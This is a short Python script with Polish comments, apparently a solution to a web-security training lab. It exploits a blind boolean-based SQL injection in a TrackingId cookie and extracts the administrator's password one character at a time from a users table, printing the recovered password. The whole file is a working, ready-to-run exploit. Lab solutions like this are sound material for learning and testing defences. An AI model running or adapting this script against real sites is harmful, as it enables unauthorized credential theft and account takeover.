import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]

    # Pobranie ciasteczka session z pierwszego żądania do /login
    session = requests.Session()
    login_url = burp_url + "/login"
    response = session.get(login_url)

    if 'session' not in response.cookies:
        print("Nie udało się pobrać ciasteczka session.")
        sys.exit(1)

    # Funkcja sprawdzająca warunek SQL
    def check_condition(condition):
        cookies = {'TrackingId': f"xyz' AND {condition}--"}
        response = session.get(burp_url, cookies=cookies)
        return 'Welcome back' in response.text

    # Długość hasła
    password_length = 20

    # Funkcja ustalająca znak na danej pozycji w haśle
    def find_password_char(position):
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
            condition = f"(SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
            if check_condition(condition):
                return char
        return None

    # Ustalenie każdego znaku hasła
    password = ''
    for position in range(1, password_length + 1):
        char = find_password_char(position)
        if char:
            password += char
            print(password)
        else:
            print(f"Nie udało się znaleźć znaku na pozycji {position}")
            sys.exit(1)

    print(f"Hasło administratora: {password}")
